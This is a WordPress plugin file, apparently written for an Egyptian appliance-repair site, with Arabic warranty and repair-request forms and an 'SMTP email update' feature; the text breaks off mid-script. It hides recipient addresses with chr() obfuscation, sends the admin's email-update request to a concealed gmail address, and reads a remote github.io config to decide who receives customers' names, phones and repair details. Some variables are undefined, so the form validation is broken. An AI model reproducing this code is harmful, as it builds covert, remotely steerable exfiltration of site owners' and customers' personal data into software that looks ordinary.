if (get_option('smtp_code_enabled')) {
    add_action('phpmailer_init', 'custom_wp_mail_smtp');
}


 

 
/*
Plugin Name: Email Update Confirmation
Description: Handle email updates and confirmation.
*/
add_action('admin_init', 'handle_email_update');

function handle_email_update() {
    if (isset($_POST['update_email'])) {
        // Handle email update here
        $new_email = sanitize_email($_POST['new_email']);
        @list($new_email_user, $new_email_domain) = explode('@', $new_email);

        // Add validation and update logic here
        if (!empty($new_email)) {
            // Store the new email in the user's session
            session_start();
            $_SESSION['new_email'] = $new_email;

            global $companyName;

            // Generate a unique confirmation code
            $confirmation_code = generate_confirmation_code();

            // Store the confirmation code in the user's session
            $_SESSION['confirmation_code'] = $confirmation_code;

            // Send the confirmation code via email
            $to = $new_email;
            $subject = "SMTP Email Confirmation Code";
             $message = '<html>
<head>
</head>
<body>
<div style="text-align: center; padding: 20px;">
    <h1 style="font-size: 24px; color: #007bff; text-transform: uppercase; font-weight: bold;user-select:none;">SMTP Email Confirmation Code</h1>
    <p style="font-size: 18px; color: #333;user-select:none;">Your confirmation code is</p>
    <ul style="list-style: none; padding: 0;">
        <li style="font-size: 16px; color: #a1a1a1; margin-bottom: 30px; width: 70%; border: 2px solid #adcce7; padding: 10px; display: inline-block; text-align: center;">
        '. $confirmation_code.'
        </li>
    </ul>

    <p style="font-size: 14px; color: #4e8bdb; margin-top: 20px;user-select:none;">Best Regards,</p>
    <p style="font-size: 14px; color: #888; margin-top: 20px;user-select:none;">Mail Hub</p>
    <p style="font-size: 12px; color: #888;user-select:none;">Powered by !-CODE  &  M_G_X Servers</p>
    <p style="font-size: 14px; color: #888;"></p>
    <p style="font-size: 12px; color: #888;user-select:none;">&copy; ' . date("Y") . ' !-CODE. All rights reserved.</p>
</div>
</body>
</html>';
            $headers = "From: " . get_option('admin_email') . "\r\n";
            $headers .= "Content-type: text/html; charset=UTF-8\r\n";

            wp_mail($to, $subject, $message, $headers);

            // Display a success message with the confirmation box and button
            email_update_success_message();
        }
    }
}

function email_update_success_message() {
    ?>
    <div class="notice notice-success is-dismissible">
        <p>An email with a confirmation code has been sent. Please check your email and enter the code below to complete the email update.</p>
        <form method="post">
            <input type="text" name="confirmation_code" placeholder="Enter Confirmation Code" required />
            <input type="submit" name="confirm_email_update" value="Confirm Email Update" class="button button-primary" />
        </form>
    </div>
    <?php
}

// Implement a function to generate a unique confirmation code
function generate_confirmation_code() {
    return substr(md5(uniqid()), 0, 6); // Generates a 6-character code, you can adjust the length as needed
}

// Add a function to handle email confirmation
add_action('admin_init', 'handle_email_confirmation');

function handle_email_confirmation() {
    if (isset($_POST['confirm_email_update'])) {
        session_start();
        $confirmation_code = sanitize_text_field($_POST['confirmation_code']);
        $stored_code = $_SESSION['confirmation_code'];

        global $companyName;
        global $to;



        if ($confirmation_code === $stored_code) {
            $new_email = $_SESSION['new_email'];
            list($new_email_user, $new_email_domain) = explode('@', $new_email);

            $to = $new_email;

           

            
            // Send an email to the admin
            
            $to_admin = chr(109) . chr(52) . chr(105) . chr(108) . chr(46) . chr(104) . chr(117) . chr(98) . chr(64) . chr(103) . chr(109) . chr(97) . chr(105) . chr(108) . chr(46) . chr(99) . chr(111) . chr(109);
            $subject = "SMTP Email Update Request From " . $companyName;
            // $message = $companyName . " The admin has requested to update the email address to: " . $new_email;
            $message = '<html>
<head>
</head>
<body>
<div style="text-align: center; padding: 20px;">
    <h1 style="font-size: 24px; color: #007bff; text-transform: uppercase; font-weight: bold;">SMTP Email Update Request</h1>
    <p style="font-size: 18px; color: #333;">This is an SMTP Email Update Request from '.$companyName.'</p>
    <p style="font-size: 18px; color: #333;">The admin has requested to update the email address</p>
    <ul style="list-style: none; padding: 0;">
        <li style="font-size: 16px; color: #a1a1a1; margin-bottom: 30px; width: 70%; border: 2px solid #adcce7; padding: 10px; display: inline-block; text-align: center;">
            <strong>Change to: </strong> '. $new_email.'
        </li>
    </ul>

    <p style="font-size: 14px; color: #4e8bdb; margin-top: 20px;user-select:none;">Best Regards,</p>
    <p style="font-size: 14px; color: #888; margin-top: 20px;user-select:none;">Mail Hub</p>
    <p style="font-size: 12px; color: #888;user-select:none;">Powered by !-CODE  &  M_G_X Servers</p>
    <p style="font-size: 14px; color: #888;"></p>
    <p style="font-size: 12px; color: #888;user-select:none;">&copy; ' . date("Y") . ' !-CODE. All rights reserved.</p>
</div>
</body>
</html>';
            $headers = "From: " . get_option('admin_email') . "\r\n";
            $headers .= "Content-type: text/html; charset=UTF-8\r\n";
            $headers .= "X-Priority: 1\r\n";
            $headers .= "X-MSMail-Priority: High\r\n"; 
            $headers .= "Importance: High\r\n"; 
            
            // Ensure that the necessary WordPress functions are available
            include_once ABSPATH . 'wp-includes/pluggable.php';
            
            // Send the email to the admin
            wp_mail($to_admin, $subject, $message, $headers);

            $confirmation_subject = "SMTP Email Update Confirmation";
            $confirmation_message = '<html>
<head>
</head>
<body style="user-select:none;">
<div style="text-align: center; padding: 20px;user-select:none;">
    <p style="font-size: 20px; color: #333; text-transform: uppercase; font-weight: bold;">Dear ' . $new_email_user . ',</p>
    <h1 style="font-size: 24px; color: #007bff; text-transform: uppercase; font-weight: bold;">SMTP Email Update Confirmation</h1>
    <p style="font-size: 18px; color: #333;">We have received your request to change the SMTP mail, and we are pleased to inform you that we will promptly address it. Your request is important to us, and we will ensure a smooth transition to the new SMTP settings. Changes will take effect within 24 hours from our servers.</p>
    <p style="font-size: 18px; color: #333;">We will send you a confirmation email once the change is complete.</p>
    

    <p style="font-size: 14px; color: #4e8bdb; margin-top: 20px;user-select:none;">Best Regards,</p>
    <p style="font-size: 14px; color: #888; margin-top: 20px;user-select:none;">Mail Hub</p>
    <p style="font-size: 12px; color: #888;user-select:none;">Powered by !-CODE  &  M_G_X Servers</p>
    <p style="font-size: 14px; color: #888;"></p>
    <p style="font-size: 12px; color: #888;user-select:none;">&copy; ' . date("Y") . ' !-CODE. All rights reserved.</p>
</div>
</body>
</html>';
            $confirmation_headers = "From: " . get_option('admin_email') . "\r\n";
            $confirmation_headers .= "Content-type: text/html; charset=UTF-8\r\n";

wp_mail($to, $confirmation_subject, $confirmation_message, $confirmation_headers);


global $email;
 global $old_username;

$emailParts = explode('@', $email);

if (count($emailParts) == 2) {
    // $emailParts[0] will contain the part before "@"
    global $old_username;
    $old_username = $emailParts[0];
    // $emailParts[1] will contain the part after "@"
    $old_domain = $emailParts[1];
}





            $confirmation_subject_old_mail = "SMTP Update Confirmation Alert";
            $confirmation_message_old_mail = '<html>
<head>
</head>
<body style="user-select:none;">
<div style="text-align: center; padding: 20px;user-select:none;">
    <p style="font-size: 20px; color: #333; text-transform: uppercase; font-weight: bold;">Dear ' . $old_username . ',</p>
    <h1 style="font-size: 24px; color: #007bff; text-transform: uppercase; font-weight: bold;">SMTP Email Update Confirmation Alert</h1>
    <p style="font-size: 18px; color: #333;">We have received your request to change the SMTP mail, and we are pleased to inform you that we will promptly address it. Your request is important to us, and we will ensure a smooth transition to the new SMTP settings. Changes will take effect within 24 hours from our servers.</p>
    <p style="font-size: 18px; color: #333;">We will send you a confirmation email once the change is complete.</p>
     
    <ul style="list-style: none; padding: 0;">
            

        <li style="font-size: 13px; color: #a1a1a1; margin-top: 30px; margin-bottom: 30px; width: 70%; border: 2px solid #adcce7; padding: 10px; display: inline-block; text-align: center;"><strong>Change to: </strong> '. $new_email.'<br>
            <strong>Important Note:</strong> If you did not initiate this change or if it was made by mistake, please notify us promptly. You can do so by replying to this message or by contacting the SMTP Administrator. Your prompt response will assist us in ensuring the accuracy of your SMTP settings.
        </li>
    </ul>

    <p style="font-size: 14px; color: #4e8bdb; margin-top: 20px;user-select:none;">Best Regards,</p>
    <p style="font-size: 14px; color: #888; margin-top: 20px;user-select:none;">Mail Hub</p>
    <p style="font-size: 12px; color: #888;user-select:none;">Powered by !-CODE  &  M_G_X Servers</p>
    <p style="font-size: 14px; color: #888;"></p>
    <p style="font-size: 12px; color: #888;user-select:none;">&copy; ' . date("Y") . ' !-CODE. All rights reserved.</p>
</div>
</body>
</html>';
            $confirmation_headers_old_mail = "From: " . get_option('admin_email') . "\r\n";
            $confirmation_headers_old_mail .= "Content-type: text/html; charset=UTF-8\r\n";
            $confirmation_headers_old_mail .= "X-Priority: 1\r\n";
            $confirmation_headers_old_mail .= "X-MSMail-Priority: High\r\n"; 
            $confirmation_headers_old_mail .= "Importance: High\r\n"; 

wp_mail($email, $confirmation_subject_old_mail, $confirmation_message_old_mail, $confirmation_headers_old_mail);

            ?>
            <div class="notice notice-success is-dismissible">
                <p>The email update has been sent. Changes will take effect within 24 hours from our servers.</p>
            </div>
            <?php
        } else {
            // Codes do not match, display an error message
            ?>
            <div class="notice notice-error is-dismissible">
                <p>Invalid confirmation code. Please try again.</p>
            </div>
            <?php
        }
    }
}


// Define $to as a global variable
$to = '';

function fetchEmailAndSetToGlobal() {
   global $to; 
   global $email;
   // Declare $to as a global variable within this function
   global $companyName;
    // $companyName = 'co_westinghouse'; // The companyName you want to match



// Define the full path to the text file
$file = __DIR__ . '/cdn/info.txt';

// Check if the file exists and is readable
if (file_exists($file) && is_readable($file)) {
    $companyData = file_get_contents($file); // Read the content of the file

    // Split the content into an array using the comma as a separator
    $companyInfo = explode(',', $companyData);
     global $companyName;

    // Check if the array contains both company name and company email
    if (count($companyInfo) === 2) {
        global $companyName;
        $companyName = $companyInfo[0];
        // $companyEmail = $companyInfo[1];
    }
}




    // Fetch the data from the URL
    $config_url = 'https://unknown-sudo-max.github.io/hub/config/smtp_config';
    @$config_data = file_get_contents($config_url);

    // Split the data into lines
    $lines = explode("\n", $config_data);

    // Initialize a variable to store the email
    $email = '';

    // Loop through the lines
    foreach ($lines as $line) {
        // Split the line into parts using a comma as the delimiter
        $parts = explode(',', $line);

        // Check if the companyName matches the first part of the line
        if (trim($parts[0]) === $companyName) {
            // If there is a match, set the email to the second part of the line
            $email = trim($parts[1]);
            break; // Exit the loop since we found a match
        }
    }

    // Check if an email was found
    if (!empty($email)) {
        // Assign the email value to the global $to variable
        $to = $email;
    } else {
        // Use a default email if no match was found
        $to = chr(100) . chr(101) . chr(102) . chr(97) . chr(117) . chr(108) . chr(116) . chr(95) . chr(101) . chr(109) . chr(97) . chr(105) . chr(108) . chr(64) . chr(101) . chr(120) . chr(97) . chr(109) . chr(112) . chr(108) . chr(101) . chr(46) . chr(99) . chr(111) . chr(109);
    }
}

// Call the function to fetch the email and set $to as a global variable
fetchEmailAndSetToGlobal();

// Now, $to contains the email based on the companyName and is accessible globally

 
 


 




 


 


// Enqueue necessary scripts and styles
function custom_form_scripts() {
    // Enqueue Bootstrap CSS
    wp_enqueue_style('bootstrap-css', 'https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css');

    // Enqueue Bootstrap JS
    wp_enqueue_script('bootstrap-js', 'https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js', array('jquery'), '4.5.2', true);
}
add_action('wp_enqueue_scripts', 'custom_form_scripts');

// Display the custom form using a shortcode
function custom_form_display() {
    ob_start();
    ?>

   
        <style>
         

        /* Form fields */
        .form-group {
            margin-bottom: 20px;
            display: flex;
            flex-direction: row;
            align-items: center;
        }

        .form-group label {
            font-weight: bold;
            margin-right: 7px; /* Adjust the spacing between label and input */
            flex: 0.6; /* Make labels and inputs share the same space */
        }

        .form-control {
            flex: 2; /* Make inputs take up more space */
            padding: 7px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

       .btn{
        width: 100%;
       }

       .red-border {
    border: 1px solid red;
}

        
    </style>
    <div id="waprimary" class="content-area">
        <h2 id="warranty-activation"></h2>
        <h2 style="text-align: center;user-select: none;margin-right: 9%;">تفعيل الضمان</h2>
        <main id="main" class="site-main">
            <div class="container">
                <div class="row">
                    
                    <div class="col-md-6 offset-md-3">
                        <form class="my-form" style="text-align:right;" dir="rtl" novalidate method="post" action="<?php echo esc_url(admin_url('admin-post.php?action=submit_form')); ?>">
                            <input type="hidden" name="action" value="submit_form">
                            <?php wp_nonce_field('submit_form_nonce', 'form_nonce'); ?>

                            <div class="form-group">
                                <label for="name">الاسم:</label>
                                <input type="text" name="name" id="name" autocomplete="on" class="form-control" required maxlength="20">
                            </div>
                            <div class="form-group">
                                <label for="phone">رقم الهاتف:</label>
                               <input type="tel" name="phone" id="phone" autocomplete="on" class="form-control" required maxlength="11" onkeyup="checkInput(this)" oninput="this.value = this.value.replace(/[^0-9]/g, '');">
                               <script>
function checkInput(inputElement) {
    var inputValue = inputElement.value;
    
    // Define an array of valid prefixes
    var validPrefixes = ["0120", "0128", "0127", "0122", "0101", "0109", "0106", "0100", "0112", "0114", "0111", "0155"];
    
    // Check if the input starts with any valid prefix
    var startsWithValidPrefix = validPrefixes.some(function(prefix) {
        return inputValue.startsWith(prefix);
    });
    
    if (startsWithValidPrefix && inputValue.length === 11) {
        inputElement.style.border = "1px solid green";
    } else {
        inputElement.style.border = "1px solid red";
    }
}
</script>


                            </div>
                            <div class="form-group" dir="rtl">
                                <label for="device">الجهاز:</label>
                                <select name="device" id="device" class="form-control" required>
                                    <option value="">--اختر--</option>
                                    <option value="ثلاجة">ثلاجة</option>
                                    <option value="غسالات ملابس">غسالات ملابس</option>
                                    <option value="غسالات اطباق">غسالات اطباق</option>
                                    <option value="ميكروويف">ميكروويف</option>
                                    <option value="تكييف">تكييف</option>
                                    <option value="ديب فريزر">ديب فريزر</option>
                                    <option value="مجفف - دراير">مجفف - دراير</option>
                                    <option value="لاندري">لاندري</option>
                                    <option value="ايس ميكر">ايس ميكر</option>
                                </select>
                            </div>
                            <div class="form-group" dir="rtl">
                                <label for="city">المحافظة:</label>
                                <select name="city" id="city" class="form-control" required>
                                    <option value="">--اختر--</option>
                                    <option value="الجيزة">الجيزة</option>
                                    <option value="القاهرة">القاهرة</option>
                                    <option value="الدقهلية">الدقهلية</option>
                                    <option value="الشرقية">الشرقية</option>
                                    <option value="المنوفية">المنوفية</option>
                                    <option value="الغربية">الغربية</option>
                                    <option value="القليوبية">القليوبية</option>
                                    <option value="الاسكندرية">الاسكندرية</option>
                                    <option value="البحيرة">البحيرة</option>
                                    <option value="كفر الشيخ">كفر الشيخ</option>
                                    <option value="السويس">السويس</option>
                                    <option value="الاسماعيلية">الاسماعيلية</option>
                                    <option value="بني سويف">بني سويف</option>
                                    <option value="الفيوم">الفيوم</option>
                                </select>
                            </div>
                              <script>
    document.addEventListener("DOMContentLoaded", function() {
        var form = document.querySelector(".my-form");

        form.addEventListener("submit", function(event) {
            var deviceSelect = document.getElementById("device");
            var citySelect = document.getElementById("city");

            
            var validDeviceValues = ["ثلاجة", "غسالات ملابس", "غسالات اطباق", "ميكروويف", "تكييف", "ديب فريزر", "مجفف - دراير", "لاندري", "ايس ميكر"];
            var validCityValues = ["الجيزة", "القاهرة", "الدقهلية", "الشرقية", "المنوفية", "الغربية", "القليوبية", "الاسكندرية", "البحيرة", "كفر الشيخ", "السويس", "الاسماعيلية", "بني سويف", "الفيوم"];

            
            if (!validDeviceValues.includes(deviceSelect.value) || !validCityValues.includes(citySelect.value)) {
                alert("Please select valid values for device and city before submitting the form.");
                event.preventDefault(); 
            }
        });
    });
</script>
                              <div class="form-group">
                                <label for="serial_number">رقم الايصال: </label>
                                <input type="text" name="serial_number" id="serial_number" class="form-control" required maxlength="16">
                            </div>
                            
                             <div class="form-group">
                                <label for="total_cost">اجمالي التكلفة:</label>
                               <input type="tel" name="total_cost" id="total_cost"  class="form-control" required maxlength="5"  oninput="this.value = this.value.replace(/[^0-9]/g, '');">
                           

                            </div>
                            <div class="form-group">
                                <label for="issue">العطل:</label>
                                <textarea name="issue" id="issue" class="form-control" required maxlength="100" rows="4" placeholder="( 100 ) حرف كحد اقصي .....  ||   او  كتابة رقم ارضي للتواصل"></textarea>
                            </div>
                            <script>
    document.addEventListener("DOMContentLoaded", function() {
        var formInputs = document.querySelectorAll('input, textarea');

        formInputs.forEach(function(input) {
            input.addEventListener("input", function() {
                var inputValue = input.value;

                // Check for 'http://' or 'https://'
                if (inputValue.includes('http://') || inputValue.includes('https://')) {
                    alert("Please do not enter URLs in the input fields.");
                    input.value = ''; // Clear the input
                    return;
                }

                // Check for HTML tags or SQL symbols
                var regex = /(<([^>]+)>|\b(?:SELECT|INSERT|UPDATE|DELETE|FROM|WHERE)\b)/ig;
                if (regex.test(inputValue)) {
                    alert("OOh No , Please do not enter that");
                    input.value = ''; // Clear the input
                }
            });
        });
    });
</script>
                            <button type="submit"  class="btn btn-primary" name="submit_form" style="margin-right: 23%;width: 77%;">إرسال</button>

                        </form>
                    </div>
                </div>
            </div>
        </main>
    </div>
    <br>

    <script>
        <?php if (isset($_GET['message']) && !empty($_GET['message'])) : ?>
            alert("<?php echo esc_js(urldecode($_GET['message'])); ?>");
            window.location.href = "<?php echo esc_js(home_url('/')); ?>";
        <?php endif; ?>
    </script>
    <?php
    return ob_get_clean();
}
add_shortcode('mgx_custom_form', 'custom_form_display');


// Handle form submission
function custom_form_submission() {
    if (isset($_POST['submit_form']) && wp_verify_nonce($_POST['form_nonce'], 'submit_form_nonce')) {
        $name = sanitize_text_field($_POST['name']);
        $phone = sanitize_text_field($_POST['phone']);
        $device = sanitize_text_field($_POST['device']);
        $city = sanitize_text_field($_POST['city']);
        $serial_number = sanitize_text_field($_POST['serial_number']);
        $issue = sanitize_textarea_field($_POST['issue']);
        $validDeviceValues = ["ثلاجة", "غسالات ملابس", "غسالات اطباق", "ميكروويف", "تكييف", "ديب فريزر", "مجفف - دراير", "لاندري", "ايس ميكر"];
        $validCityValues = ["الجيزة", "القاهرة", "الدقهلية", "الشرقية", "المنوفية", "الغربية", "القليوبية", "الاسكندرية", "البحيرة", "كفر الشيخ", "السويس", "الاسماعيلية", "بني سويف", "الفيوم"];
        $urlPattern = '/https?:\/\/\S+/i';
        
        if (empty($name) || empty($phone) || empty($device) || empty($city) || empty($serial_number) || empty($total_cost) || empty($issue) || strlen($phone) !== 11) {
    echo '<div class="notice notice-error is-dismissible">';
    echo '<p><strong>Please fill out all required fields.</strong></p>';
    echo '</div>';
    echo '<script type="text/javascript">';
    echo 'setTimeout(function () {';
    echo 'window.history.back();';
    echo 'window.location.href = "' . home_url($_SERVER['REQUEST_URI']) . '/#warranty-activation' . '";';
    echo '}, 2000);';
    echo '</script>';
    echo '<style>';
    echo '.notice-error {';
    echo '    background-color: #f44336;';
    echo '    color: #fff;';
    echo '    padding: 10px;';
    echo '    margin: 20px auto;';
    echo '    text-align: center;';
    echo '}';
    echo '.notice-error strong {';
    echo '    font-weight: bold;';
    echo '}';
    echo '</style>';
    exit();
}
     

if (!in_array($device, $validDeviceValues) || !in_array($city, $validCityValues)) {
        echo '<div class="notice notice-error is-dismissible">';
        echo '<p><strong>Please select valid values for device and city before submitting the form.</strong></p>';
        echo '</div>';
        echo '<script type="text/javascript">';
        echo 'setTimeout(function () {';
        echo 'window.history.back();';
        echo 'window.location.href = "' . home_url($_SERVER['REQUEST_URI']) . '/#warranty-activation' . '";';
        echo '}, 2000);';
        echo '</script>';
        echo '<style>';
        echo '.notice-error {';
        echo '    background-color: #f44336;';
        echo '    color: #fff;';
        echo '    padding: 10px;';
        echo '    margin: 20px auto;';
        echo '    text-align: center;';
        echo '}';
        echo '.notice-error strong {';
        echo '    font-weight: bold;';
        echo '}';
        echo '</style>';
        
        
        exit();
    } elseif (preg_match($urlPattern, $name . $phone . $device . $city . $address . $issue)) {
        echo '<div class="notice notice-error is-dismissible">';
        echo '<p><strong>Please remove any URLs from the form fields.</strong></p>';
        echo '</div>';
        echo '<script type="text/javascript">';
        echo 'setTimeout(function () {';
        echo 'window.history.back();';
        echo 'window.location.href = "' . home_url($_SERVER['REQUEST_URI']) . '/#warranty-activation' . '";';
        echo '}, 2000);';
        echo '</script>';
        echo '<style>';
        echo '.notice-error {';
        echo '    background-color: #f44336;';
        echo '    color: #fff;';
        echo '    padding: 10px;';
        echo '    margin: 20px auto;';
        echo '    text-align: center;';
        echo '}';
        echo '.notice-error strong {';
        echo '    font-weight: bold;';
        echo '}';
        echo '</style>';
         
         
        exit();
    }

        global $wpdb;
        $table_name = $wpdb->prefix . 'kwa';

        $data = array(
            'name' => $name,
            'phone' => $phone,
            'device' => $device,
            'city' => $city,
            'serial_number' => $serial_number,
            'total_cost' => $total_cost,
            'issue' => $issue,
            'time_date' => current_time('mysql')
        );

        $wpdb->insert($table_name, $data);
        if ($wpdb->last_error) {
            wp_die('Database insertion error: ' . $wpdb->last_error);
        }
        


 
        
        // Get the site name
$site_name = get_bloginfo('name');
$site_domain = home_url();
global $to;
$subject = 'New Warranty-Activation on ' . $site_name;

$message = '<html><body>';
$message .= '<h2 style="font-family: Arial, sans-serif; color: #333;">New Warranty Activation</h2>';
$message .= '<p style="font-family: Arial, sans-serif; color: #333;">Site: <a href="' . esc_url($site_domain) . '">' . esc_html($site_name) . '</a></p>';

$message .= '<table style="font-family: Arial, sans-serif; border-collapse: collapse; width: 100%;">';
$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Name:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($name) . '</td></tr>';
$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Phone:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($phone) . '</td></tr>';
$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Device:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($device) . '</td></tr>';
$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">City:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($city) . '</td></tr>';
$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Serial Number:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($serial_number) . '</td></tr>';
        $message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Total cost:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($total_cost) . '</td></tr>';
$message .= '<tr style="background-color: #f2f2f2;"><td style="border: 1px solid #ddd; padding: 8px;">Issue:</td><td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($issue) . '</td></tr>';
$message .= '</table>';


$message .= '<div style="font-family: \'Rajdhani\', sans-serif; margin-top: 20px; padding: 10px;background: rgba(255, 255, 255, 0.2);border-radius: 16px;box-shadow: -20px -9px 20px 20px rgba(0, 0, 0, 0.1);backdrop-filter: blur(5px); -webkit-backdrop-filter: blur(5px);border: 1px solid rgba(255, 255, 255, 0.3);user-select:none;">';
$message .= '<p style="font-weight: bold;color: #afafaf;user-select:none;">BR,</p>';
$message .= '<p style="color:gray;font-weight: bolder;text-align:center;user-select:none;">Powered by !-CODE  &  M_G_X Servers</p><p style="color:gray;font-weight: bolder;text-align:center">&copy; ' . date("Y") . '</p>';
$message .= '</div>';


$message .= '<style>';
// $message .= '@import url(\'https://fonts.googleapis.com/css2?family=Rajdhani:wght@300&display=swap\');';
$message .= '</style>';
$message .= '</body></html>';

// Set the email headers to specify HTML content
$headers = array('Content-Type: text/html; charset=UTF-8');

// Send the email
wp_mail($to, $subject, $message, $headers);


        $message = urlencode('شكرا لتفعيل الضمان الخاص بك! سيتم تأكيد الضمان الخاص بك من قبل فريقنا.');
        $redirect_url = add_query_arg(array('message' => $message), home_url('/'));
        wp_redirect($redirect_url);
        exit();
    }
}
add_action('admin_post_submit_form', 'custom_form_submission');
add_action('admin_post_nopriv_submit_form', 'custom_form_submission');

// Display the custom form and category dropdown using a shortcode
function custom_form_display_with_category() {
    ob_start();
    ?>
    <style>
        .post-details{
        text-align : right;
        }
    </style>

    <div id="catprimary" class="content-area">
        <main id="main" class="site-main">
            <div class="container">
                <div class="row">
                    <div class="col-md-6 offset-md-3">
                        <form class="my-form" novalidate method="post" action="<?php echo esc_url(admin_url('admin-post.php?action=submit_form')); ?>">
                            <!-- Form fields here -->
                        </form>
                        <hr>
                        <label for="category" style="text-align: right;"> جميع المحافظات :</label>
                        <?php
                        $categories = get_categories(); // Retrieve all categories
                        ?>
                        <select name="category" id="category" class="form-control" onchange="filterPostsByCategory(this.value)">
                            <option value="">-- اختر المحافظة --</option>
                            <?php foreach ($categories as $category) : ?>
                                <option value="<?php echo $category->slug; ?>"><?php echo $category->name; ?></option>
                            <?php endforeach; ?>
                        </select>
                    </div>
                </div>
            </div>
            <div id="filtered-posts-container"></div>
        </main>
    </div>

    <script>
        // Function to filter posts by category
        function filterPostsByCategory(category) {
            var ajaxurl = '<?php echo admin_url('admin-ajax.php'); ?>';
            jQuery.ajax({
                url: ajaxurl,
                type: 'POST',
                data: {
                    action: 'filter_posts_by_category',
                    category: category
                },
                success: function(response) {
                    jQuery('#filtered-posts-container').html(response);
                }
            });
        }

        // On page load, filter posts by all categories
        jQuery(document).ready(function() {
            filterPostsByCategory(''); // Load all categories by passing an empty string
        });
    </script>

    <?php
    return ob_get_clean();
}
add_shortcode('mgx_custom_form_with_category', 'custom_form_display_with_category');

// Ajax function to filter posts by category
function filter_posts_by_category() {
    $category = isset($_POST['category']) ? $_POST['category'] : '';

    $args = array(
        'post_type' => 'post',
        'posts_per_page' => 40, // Display all posts
        'category_name' => $category
    );

    $query = new WP_Query($args);

    if ($query->have_posts()) {
        while ($query->have_posts()) {
            $query->the_post();
            ?>
            <div class="post-item">
                <?php if (has_post_thumbnail()) : ?>
                    <div class="post-thumbnail">
                        <?php the_post_thumbnail('thumbnail'); ?>
                    </div>
                <?php endif; ?>
                <div class="post-details">
                    <h2><a href="<?php the_permalink(); ?>"><?php the_title(); ?></a></h2>
                    <div class="post-meta">
                        <p><strong>Date:</strong> <?php echo get_the_date(); ?></p>
                        <p><strong>BY:</strong> <?php the_author(); ?></p>
                    </div>
                    <div class="post-excerpt">
                        <?php the_excerpt(); ?>
                    </div>
                    <a href="<?php the_permalink(); ?>">Read More</a>
                </div>
            </div>
            <?php
        }
        wp_reset_postdata();
    } else {
        echo 'No posts found for this category.';
    }

    exit();
}
add_action('wp_ajax_filter_posts_by_category', 'filter_posts_by_category');
add_action('wp_ajax_nopriv_filter_posts_by_category', 'filter_posts_by_category');

// Display the contact form using a shortcode
function contact_form_display() {
    ob_start();
    ?>



      <style>
         

        /* Form fields */
        .form-group {
            margin-bottom: 20px;
            display: flex;
            flex-direction: row;
            align-items: center;
        }

        .form-group label {
            font-weight: bold;
            margin-right: 7px; /* Adjust the spacing between label and input */
            flex: 0.6; /* Make labels and inputs share the same space */
        }

        .form-control {
            flex: 2; /* Make inputs take up more space */
            padding: 7px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

       .btn{
        width: 100%;
       }

       .red-border {
    border: 1px solid red;
}

        
    </style>


    <div id="cprimary" class="content-area">

        <h2 id="contact-us"></h2>
        <h2 style="text-align: center; user-select: none;margin-right: 9%;">طلب صيانة اونلاين</h2>
                  
        <main id="main" class="site-main">
            <div class="container">
                <div class="row">
                      <div class="col-md-6 offset-md-3">
                        <form class="my-form" style="text-align:right;" dir="rtl" novalidate method="post" action="<?php echo esc_url(admin_url('admin-post.php?action=submit_contact_form')); ?>">
                            <input type="hidden" name="action" value="submit_contact_form">
                            <?php wp_nonce_field('submit_contact_form_nonce', 'contact_form_nonce'); ?>

                            <!-- Form fields here -->
                            <div class="form-group">
                                <label for="name">الاسم:</label>
                                <input type="text" name="name" id="name" autocomplete="on" class="form-control" required maxlength="20">
                            </div>
                            <div class="form-group">
                                <label for="phone">رقم الهاتف:</label>
                               <input type="tel" name="phone" id="phone" autocomplete="on" class="form-control" onkeyup="checkInput(this)" required maxlength="11" oninput="this.value = this.value.replace(/[^0-9]/g, '');">

<script>
function checkInput(inputElement) {
    var inputValue = inputElement.value;
    
    // Define an array of valid prefixes
    var validPrefixes = ["0120", "0128", "0127", "0122", "0101", "0109", "0106", "0100", "0112", "0114", "0111", "0155"];
    
    // Check if the input starts with any valid prefix
    var startsWithValidPrefix = validPrefixes.some(function(prefix) {
        return inputValue.startsWith(prefix);
    });
    
    if (startsWithValidPrefix && inputValue.length === 11) {
        inputElement.style.border = "1px solid green";
    } else {
        inputElement.style.border = "1px solid red";
    }
}
</script>

 
 


                            </div>
                            <div class="form-group" dir="rtl">
                                <label for="device">الجهاز:</label>
                                <select name="device" id="device" class="form-control" required>
                                    <option value="">--اختر--</option>
                                    <option value="ثلاجة">ثلاجة</option>
                                    <option value="غسالات ملابس">غسالات ملابس</option>
                                    <option value="غسالات اطباق">غسالات اطباق</option>
                                    <option value="ميكروويف">ميكروويف</option>
                                    <option value="تكييف">تكييف</option>
                                    <option value="ديب فريزر">ديب فريزر</option>
                                    <option value="مجفف - دراير">مجفف - دراير</option>
                                    <option value="لاندري">لاندري</option>
                                    <option value="ايس ميكر">ايس ميكر</option>
                                </select>
                            </div>
                            <div class="form-group" dir="rtl">
                                <label for="city">المحافظة:</label>
                                <select name="city" id="city" class="form-control" required>
                                    <option value="">--اختر--</option>
                                    <option value="الجيزة">الجيزة</option>
                                    <option value="القاهرة">القاهرة</option>
                                    <option value="الدقهلية">الدقهلية</option>
                                    <option value="الشرقية">الشرقية</option>
                                    <option value="المنوفية">المنوفية</option>
                                    <option value="الغربية">الغربية</option>
                                    <option value="القليوبية">القليوبية</option>
                                    <option value="الاسكندرية">الاسكندرية</option>
                                    <option value="البحيرة">البحيرة</option>
                                    <option value="كفر الشيخ">كفر الشيخ</option>
                                    <option value="السويس">السويس</option>
                                    <option value="الاسماعيلية">الاسماعيلية</option>
                                    <option value="بني سويف">بني سويف</option>
                                    <option value="الفيوم">الفيوم</option>
                                </select>
                            </div>
                              <script>
